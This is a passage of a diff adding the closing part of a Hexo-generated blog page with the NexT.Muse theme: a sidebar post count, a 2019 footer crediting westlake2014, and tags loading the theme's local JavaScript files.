+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">westlake2014</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/muse.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
